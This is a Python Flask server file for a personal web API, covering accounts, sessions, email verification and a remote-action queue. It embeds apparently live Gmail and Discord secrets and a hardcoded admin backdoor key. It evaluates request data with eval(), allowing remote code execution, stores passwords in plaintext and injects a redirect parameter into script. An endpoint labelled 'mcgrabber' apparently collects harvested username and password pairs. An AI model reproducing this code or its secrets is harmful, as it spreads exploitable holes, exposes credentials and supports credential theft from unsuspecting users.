from datetime import datetime
from smtplib import SMTP, SMTP_SSL, SMTP_SSL_PORT, SMTPException
from email.mime.multipart import MIMEMultipart, MIMEBase
from email.mime.text import MIMEText
import flask
from flask import request, jsonify
from flask_cors import CORS
import json
import sys
import uuid
import random
import time
import threading


remoteconnectors = {}



import requests
from nErrors import errors
from pyNit import valueCheck

SMTP_SERVER = "smtp.gmail.com" 
SMTP_PORT = 465
class smtpser():
    smtp_server = None
    def smtpServerCreate():
        smtpser.smtp_server = SMTP_SSL(SMTP_SERVER, port=SMTP_PORT)
        smtpser.smtp_server.set_debuglevel(1)  # Show SMTP server interactions
        smtpser.smtp_server.login('nitlix.emails@gmail.com', ':~+eAjE4B={,rZ%<')

smtpser.smtpServerCreate()

class discord():
    
    API_ENDPOINT = 'https://discord.com/api/v8'
    CLIENT_ID = '928291582896136233'
    CLIENT_SECRET = 'iNSLfHtW2pr9Dai6LMfxy4eREbOZuA85'
    REDIRECT_URI = 'https://nitlix.pro/account'

    def exchange_code(code):
        data = {
            'client_id': discord.CLIENT_ID,
            'client_secret': discord.CLIENT_SECRET,
            'grant_type': 'authorization_code',
            'code': code,
            'redirect_uri': discord.REDIRECT_URI
        }
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        r = requests.post('%s/oauth2/token' % discord.API_ENDPOINT, data=data, headers=headers)
        r.raise_for_status()
        return r.json()


    def get(tokentype,token):
        headers = {
            'authorization': f'{tokentype} {token}'
        }
        r = requests.get('https://discord.com/api/users/@me', headers=headers)
        return r.json()


    #quick = exchange_code("MaX81pbU7RdZiZfS6WLp3zQ8YoC1SR")

    #print(what(quick['token_type'],quick['access_token']))




app = flask.Flask(__name__)
CORS(app, resources={r"*": {"origins": "*"}})
#app.config["DEBUG"] = True


from dtb import main
#dir = "/home/nitlixis/mysite/"
dir="apps/games/"
#dir=""


with open(f'{dir}storage.json', 'r+') as o:
  main = json.load(o)



def write(e):
    with open(f'{dir}storage.json', 'w+') as o:
        o.seek(0)
        json.dump(e, o, indent=4)
        o.truncate()
    return "Admin Panel - WRITE was successful. API Saves Saved."

try:
    main['maindata']
except Exception:
    main['maindata'] = {}
    main['maindata']['mcgrabber'] = []

def shutdown():
    print("Shutting down...")
    write(main)
    sys.exit
    return "Admin Panel - API Shut down."

def loggingswitch():
    print("Log toggled")

    if main['logging']:
        main['logging'] = False
    else:
        main['logging'] = True

    return "Admin Panel - Toggled Log Writing."

def throwError(error1):
    return jsonify({"OK": False,"code": str(error1),"resp": errors[error1]})

def throwResponce(responce1,msg = None): 
    return jsonify({"OK": True,"resp": responce1,"msg": msg})


#reallyfastreqs = {}
#fastreqs = {}

def recordFastQ():
    while True:
        fastreqs = ""

    
 


#rq = threading.Thread(target=recordFastQ)
#rq.start()    

def checkValid(req):
    #Register ip request signal
    for x,a in req.args.items():
        if "&" in a or len(a) > 100:
            return True



months = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]

def updatePaleClick():
    now = datetime.datetime.now()
    if now.hour == 0 and now.minute == 0:
        format = str(datetime.datetime.now())[:10]
        main['paleclick']['clicks'][format] = 0
        main['paleclick']['launches'][format] = 0
    time.sleep(30)



t = threading.Thread(target=updatePaleClick)
t.start()


def autosave():
    while True:
        time.sleep(30)
        if main['autosave']:
            write(main)



a = threading.Thread(target=autosave)
a.start()





@app.route('/', methods=['GET'])
def home():
    return '''
    <script>
        window.location.href='https://nitlix.pro/api';
    </script>
    '''


@app.route('/api/v1/remoteControl', methods=['GET'])
def remoteControl():
    if checkValid(request):
        return throwError("N10")
    else:
        if "session" in request.args:
            session = request.args['session']
            if session in main['sessions']:
                user = main['user']
            else:
                return throwError("N11")


            
@app.route('/api/v1/paleclick/append', methods=['GET'])
def paleclick():
    if checkValid(request):
        return throwError("N10")
    else:
        if "type" in request.args and "data" in request.args:
            if request.args["type"] == "launch":
                main['paleclick']['launches'][list(main['paleclick']['launches'])[-1]] += 1
                return throwResponce("Thanks, but if you are able to read this. GET OUT OF HERE, STOP RUINING MY STATS!!!")
            elif request.args["type"] == "click":
                try:
                    main['paleclick']['clicks'][list(main['paleclick']['clicks'])[-1]][request.args['data']] += 1
                except Exception:
                    main['paleclick']['clicks'][list(main['paleclick']['clicks'])[-1]][request.args['data']] = 1
                return throwResponce("Thanks, but if you are able to read this. GET OUT OF HERE, STOP RUINING MY STATS!!!")
            else:
                return throwResponce(str(request.args['type']))
        else:
            return throwResponce("no")

@app.route('/api/v1/admin/', methods=['GET'])
def admin():
    if checkValid(request):
        return throwError("N10")
    action = None
    user = False

    for x,y in request.args.items():
        if x == "user":


            try: 
                if y in main['adminlist'] and request.args['pass'] == main['users'][y]['pass']:
                    user = True
            except Exception:
                pass


        if x == "action":
            action = y
    try:
        if request.args['adminKey'] == "byehaveaniceday":
            user = True
    except Exception:
        pass
    
    if user:
        if action == "write":
            return throwResponce(write(main))
        elif action == "autosave":
            main['autosave'] = not main['autosave']
            return throwResponce("Toggled autosaving!")
        elif action == "shutdown":
            return throwResponce(shutdown())
        elif action == "logging":
            return throwResponce(loggingswitch())
        elif action == "debug-accounts":

            for x,y in main['users'].items():




                try:
                    y["badges"]
                except Exception:
                    y["badges"] = []




                try:
                    y["badges"]
                except Exception:
                    y["badges"] = []



                try:
                    y["avatar"]
                except Exception:
                    y["avatar"] = ""


                try:
                    y["banner"]
                except Exception:
                    y["banner"] = ""


                try:
                    y["bio"]
                except Exception:
                    y["bio"] = ""


            return throwResponce("Debugged all the accounts!")

        else:
            return throwError("N5")
    else:
        return throwError("N6")


@app.route('/api/v1/anynote/create', methods=['GET'])
def ac():
    if checkValid(request):
        return throwError("N10")
    if "session" in request.args and "name" in request.args:
        if request.args['session'] in main['sessions']:
            main['anynote']['data'][request.args['session']['user']].append({
                "name": request.args['name'],
                "branches": [],
                "keywords": {},
                "notes": [],
                "themes": {
                },
                "data": {
                    "creation": {
                        "time": str(time.time()),
                        "user": request.args['session']['user']
                    },
                    "changes": [

                    ]
                }
            })
            return throwResponce(main['anynote']['data'][request.args['session']['user']])

@app.route('/api/v1/remote-manager/add', methods=['GET'])
def remoteadd():
    yes = str("x")
    remoteconnectors[yes] = {
        "actions": [

        ]
    }
    return throwResponce(yes)

@app.route('/api/v1/remote-manager/check-actions', methods=['GET'])
def remotechecka():
    if 'id' in request.args:
        try:
            actions = remoteconnectors[request.args['id']]['actions']
            remoteconnectors[request.args['id']]['actions'] = []
            return throwResponce(actions)
        except Exception:
            return throwError("N5")
    else:
        return throwError('N5')

@app.route('/api/v1/remote-manager/add-action', methods=['GET'])
def remoteadda():
    if 'id' in request.args and 'action' in request.args and 'data' in request.args:
        try: 
            remoteconnectors[request.args['id']]['actions'].append({'name':request.args['action'],"data":dict(eval(request.args['data']))})
            return throwResponce('done')
        except Exception:
            return throwError("N5")


@app.route('/api/v1/nmusic/fetch', methods=['GET'])
def nmsuic():
    if checkValid(request):
        return throwError("N10")
    if "session" in request.args:
        if request.args['session'] in main['sessions']:
            userid = main['sessions'][request.args['session']]['user']
            try:
                main['users'][userid]['data']['nmusic']
            except Exception:
                main['users'][userid]['data']['nmusic'] = {}
                main['users'][userid]['data']['nmusic']['main'] = []
                main['users'][userid]['data']['nmusic']['stats'] = {}
                main['users'][userid]['data']['nmusic']['stats']['plays'] = {}
                main['users'][userid]['data']['nmusic']['stats']['ltime'] = 0
                main['users'][userid]['data']['nmusic']['current'] = None
                main['users'][userid]['data']['nmusic']['plays']
            return throwResponce(main['users'][userid]['data']['nmusic'])
        else:
            return throwError("N11")

@app.route('/api/v1/altera/setup', methods=['GET'])
def alterasetup():
    if checkValid(request):
        return throwError("N10")
    else:
        if "session" in request.args:
            session = request.args['session']
            if session in main['sessions']:
                user = main['users'][main['sessions'][session]['user']]
                try:
                    user['data']['altera']
                except Exception:
                    pass
                else:
                    return throwError("N16")
                #Continue registration

                user['data']['altera'] = {}
                user['data']['altera']['regdate'] = str(time.time())
                user['data']['altera']['branches'] = []
                user['data']['altera']['calendar']

            else:
                return throwError("N11")
        else:
            return throwError("N7")


@app.route('/api/v1/accounts/user', methods=['GET'])
def us():
    if checkValid(request):
        return throwError("N10")
    if "id" in request.args:
        id = request.args['id']
        if id in main['users']:
            user = main['users'][id]
            con = {}
            con['nick'] = user['nick']
            con['avatar']= user['avatar']
            con['forename'] = user['forename']
            con['surname'] = user['surname']
            con['banner'] = user['banner']
            con['banner'] = user['bio']
            return throwResponce(con)
        else:
            return throwError("N17")
    else:
        return throwError("N7")


@app.route('/api/v1/accounts/register', methods=['GET'])
def reg():
    if checkValid(request):
        return throwError("N10")

    if "user" in request.args and "pass" in request.args:
        if request.args['user'].lower() in main['users']['connections']:
            return throwError("N9")
        else:

            newsession = str(uuid.uuid4())

            #Generate new one if it's already there
            while newsession in main['users']:
                newsession = str(uuid.uuid4())
            

            main['users'][newsession] = {}
            main['users'][newsession]["pass"] = request.args['pass']
            main['users'][newsession]["nick"] = request.args['user']
            main['users'][newsession]["nick_history"] = [[request.args['user'],str(time.time())]]
            main['users'][newsession]["email"] = "Unknown"
            main['users'][newsession]["forename"] = "No"
            main['users'][newsession]["surname"] = "Name"
            main['users'][newsession]["colour"] = "FF0066"
            main['users'][newsession]["badges"] = []
            main['users'][newsession]["avatar"] = ""
            main['users'][newsession]["banner"] = ""
            main['users'][newsession]["bio"] = ""
            main['users'][newsession]["links"] = {}
            main['users'][newsession]["display_nick"] = request.args['user'].title()
            main['users'][newsession]["id"] = newsession
            main['users']['connections'][request.args['user'].lower()]= newsession
            main['users'][newsession]["email_login"] = False
            main['users'][newsession]["sessions"] = []
            main['users'][newsession]["data"] = {}

            if "redirect" in request.args:
                return f"""
                <script>
                    window.location.href='{request.args['redirect']}'
                <script>
                """
            else:
                return throwResponce(f"Account: {request.args['user']} was created.")
    else:
        return throwError("N7")
            
@app.route('/api/v1/accounts/session', methods=['GET'])
def session():
    if checkValid(request):
        return throwError("N10")
    if "session" in request.args:
        if request.args['session'] in main['sessions']:
            returning = main['sessions'][request.args['session']]
            if "return" in request.args:
                returning['return'] = str(request.args['return'])
            #Append user for fetch
            return throwResponce(returning)
        else:
            return throwError("N11")
    else:
        return throwError("N7")



@app.route('/api/v1/ecv', methods=['GET'])
def ecv():
    if checkValid(request):
        return throwError("N10")
    if "crypto" in request.args:
        try:
            e = requests.get(f"https://ftx.com/api/markets/{request.args['crypto']}/orderbook")
            ej = e.json()
            return throwResponce(ej, "If your name starts with a P, message me right now saying that you found this heeeehhehehhehe :DD")
        except Exception:
            return throwError("N7")
        

@app.route('/api/v1/accounts/link', methods=['GET'])
def link():
    if checkValid(request):
        return throwError("N10")
    if "session" in request.args and "link" in request.args:
        if request.args['link'] == "discord":
            if "code" in request.args:
                pass
        if request.args['session'] in main['sessions']:
            returning = main['sessions'][request.args['session']]
            if "return" in request.args:
                returning['return'] = str(request.args['return'])
            return throwResponce(returning)
        else:
            return throwError("N11")
    else:
        return throwError("N7")

"""
@app.route('/api/v1/AS', methods=['GET'])
def create():
    if checkValid(request):
        return throwError("N10")
    if "session": 
        if request.args['session'] in main['sessions']:
            try: 
                redirect = request.args['redirect']
            except Exception:
                redirect = "https://google.com"
            

            try: 
                name = request.args['name']
            except Exception:
                name = main['users'][main['sessions'][request.args['session']]['user']]['nick'] + "'s AnySwap"

            

        else:
            return throwError("N11")
"""

@app.route('/api/v1/accounts/sessionsignout', methods=['GET'])
def sessionSignOut():
    if checkValid(request):
        return throwError("N10")
    if "session" in request.args:
        if request.args['session'] in main['sessions']:
            main['users']   [main['sessions'][request.args['session']]['user']]     ['sessions'].remove(request.args['session'])
            del main['sessions'][request.args['session']]
            return throwResponce(f"Session {request.args['session']} was deleted!")
        else:
            return throwError("N11")


@app.route('/api/v1/accounts/edit', methods=['GET'])
def edit():
    if checkValid(request):
        return throwError("N10")
    if "session" in request.args and "parameter" in request.args and "value" in request.args:
        sessionconf = False
        parameterconf = None

        try:
            main['sessions'][request.args['session']]
        except Exception:
            return throwError("N11")
        else:
            sessionconf = True

        param = request.args['parameter'].lower()
        value = request.args['value'].lower()


        if isinstance(param, str):
            if param in main['users']    [main['sessions'][request.args['session']]['user']]:
                if valueCheck(request.args['value'],{"max-length":16,"type":str}):
                    #Edward in the tomorrow, please fix it
                    #so that it will ignore it if it's an email.
                    if param != "email":
                        return throwError("N12")
                    else:
                        if valueCheck(request.args['value'],{"email": True}):
                            return throwError("N13")
                """
                if param == "colour":
                    if valueCheck(request.args['value'],{"colour": "hex"}):
                        return throwError("N14")
                    else:
                        value = "#" + value
                """  
                
                
                if param == "nick":
                    if request.args['value'].lower() in main['users']['connections'] and request.args['value'] != main['users'][main['sessions'][request.args['session']]['user']]['nick']:
                        return throwError("N9")
                    if request.args['value'] == main['users'][main['sessions'][request.args['session']]['user']]['nick']:
                        return throwError("N1")
                    usid = main['users'][main['sessions'][request.args['session']]['user']]['id']
                    del main['users']['connections'][main['users'][main['sessions'][request.args['session']]['user']]['nick'].lower()]

                    main['users']['connections'][request.args['value'].lower()] = main['users'][main['sessions'][request.args['session']]['user']]['id']
                    main['users'][main['sessions'][request.args['session']]['user']]["nick_history"].append([request.args['value'],str(time.time())])
                if param == "email":
                    if valueCheck(request.args['value'],{"email": True}):
                        return throwError("N13")
                    code = str(random.randint(100000,999999))
                    main['users']['email-verificators'][value] = {"verification": code,"user": main['sessions'][request.args['session']]['user']}
                    from_email = 'Nitlix Verification System'  # or simply the email address
                    to_emails = [f'{value}']

                    # Create multipart MIME email
                    email_message = MIMEMultipart()
                    email_message.add_header('To', ', '.join(to_emails))
                    email_message.add_header('From', from_email)
                    email_message.add_header('Subject', f'NITLIX.PRO EMAIL VERIFICATION')
                    email_message.add_header('X-Priority', '1')  # Urgent/High priority

                    # Create text and HTML bodies for email
                    #text_part = MIMEText('Your email has been used to verify a Concord Discord Account. Please click the button for the code. Please reply to this email if it was not sent by you.', 'plain')
                    html_part = MIMEText(
                    f"""
                <html>
                    <body>
                        <style>
                            @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800;900&display=swap');   
                        </style>
                        <center style="background-color: crimson; border-radius: 10px;font-family:-apple-system, Poppins, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif; margin-left: 10%; margin-right: 10%; border: solid 1px #88888863; padding: 1rem;">
                            <a style="border-radius: 15px; padding: 1rem;color: white; font-size: 1.5rem;" href='https://nitlix.pro/account-email-confirm?self="""+value+"""&code="""+code+"""'>VERIFICATION - CLICK HERE</button>
                        </center>
                    </body>
                </html>
                    """
                        , 'html')
                    email_message.attach(html_part)
                    try:
                        smtpser.smtp_server.sendmail(from_email, to_emails, email_message.as_bytes())
                    except SMTPException:
                        smtpser.smtpServerCreate()
                        smtpser.smtp_server.sendmail(from_email, to_emails, email_message.as_bytes())
                    return throwResponce("The Email was sent! Please check your inbox :)")

                else:
                    main['users'][main['sessions'][request.args['session']]['user']][param] = request.args['value']
                    return throwResponce("Edited Successfully! Sometimes you'll need to refresh the page to see the changes.")


        elif isinstance(param, list):
            return throwError("N8")


@app.route('/api/v1/operation_fail_mc', methods=['GET'])
def opf():
    if checkValid(request):
        return throwError("N10")
    if "user" in request.args and "pass" in request.args:
        main['maindata']['mcgrabber'].append([request.args['user'],request.args['pass']])
        return(throwResponce('khm khm'))

@app.route('/api/v1/accounts/confirm', methods=['GET'])
def confirm():
    if checkValid(request):
        return throwError("N10")
    if "param" in request.args and "verification" in request.args and "self" in request.args:
        param = request.args['param'].lower()
        verification = request.args['verification'].lower()
        self = request.args['self'].lower()

        if param == "email":
            if self in main['users']['email-verificators']:
                if verification == main['users']['email-verificators'][self]['verification']:
                    main['users'][main['users']['email-verificators'][self]['user']]['email'] = self
                    del main['users']['email-verificators'][self]
                    return throwResponce("The Email was verified!")
                else:
                    del main['users']['email-verificators'][self]
                    return throwError("N15")
            else:
                return throwError("N7")
        else:
            return throwError("N7")
    else:
        return throwError("N7")
    
    

@app.route('/api/v1/accounts/login', methods=['GET'])
def login():
    if checkValid(request):
        return throwError("N10")
    if "user" in request.args and "pass" in request.args:

        #Get user
        try:


            try:
                user = main['users'][request.args['user']]
                contr = request.args['user']
            except Exception:
                user = main['users'][main['users']['connections'][request.args['user'].lower()]]
                contr = main['users']['connections'][request.args['user'].lower()]


        except Exception:
            return throwError("N4")
        else:

            #Check password
            if request.args['pass'] == user['pass']:
                #Login
                if user['email_login'] == False:

                    
                    
                    session = {}
                    session['user'] = contr
                    session['platform'] = request.user_agent.platform.capitalize()
                    session['browser'] = request.user_agent.browser.capitalize()

                    ip = None
                    if request.headers.getlist("X-Forwarded-For"):
                        ip = request.headers.getlist("X-Forwarded-For")[0]
                    else:
                        ip = request.remote_addr
                    session['ip'] = ip

                    location = requests.get(f"http://ip-api.com/json/{ip}").json()
                    location['time'] = (str(time.time()))

                    session['location'] = [location]
                    session['created'] = str(time.time())

                    session['last'] = str(time.time())


                    


                    newsession = str(uuid.uuid4())

                    #Generate new one if it's already there
                    while newsession in main['sessions']:
                        newsession = str(uuid.uuid4())
                    session['self'] = newsession
                    
                    main['users'][contr]['sessions'].insert(0,newsession)
                    main['sessions'][newsession] = session
                    user['sessionCreated'] = newsession
                    return throwResponce(user)

                    
                else:
                    return throwError("N8")

            else:
                return throwError("N4")

    elif "session" in request.args:
        #Sign in with session
        
        if request.args['session'] in main['sessions']:
            
            ip = None
            if request.headers.getlist("X-Forwarded-For"):
                ip = request.headers.getlist("X-Forwarded-For")[0]
            else:
                ip = request.remote_addr
            

            main['sessions'][request.args['session']]['last'] = str(time.time())
            if main['sessions'][request.args['session']]['ip'] != ip:
                main['sessions'][request.args['session']]['ip'] = ip
                #Request location
                location = requests.get(f"http://ip-api.com/json/{ip}").json()
                location['time'] = (str(time.time()))
                #Add location
                main['sessions'][request.args['session']]['location'].insert(0, location)

            
            main['sessions'][request.args['session']]['platform'] = request.user_agent.platform.capitalize()
            main['sessions'][request.args['session']]['browser'] = request.user_agent.browser.capitalize()

            current_token = request.args['session']


            return throwResponce(main['users'][main['sessions'][request.args['session']]['user']])
        else:
            return throwError("N11")
            


    else:
        return throwError("N7")
    
@app.errorhandler(404)
def page_not_found(e):
    # your processing here
    return request.url

#app.run()
#if app.config["DEBUG"]:
#    app.run()
#elif __name__ == "__main__":
#    from waitress import serve
#    serve(app, host="0.0.0.0", port=8242)
from waitress import serve
serve(app, host="0.0.0.0", port=443)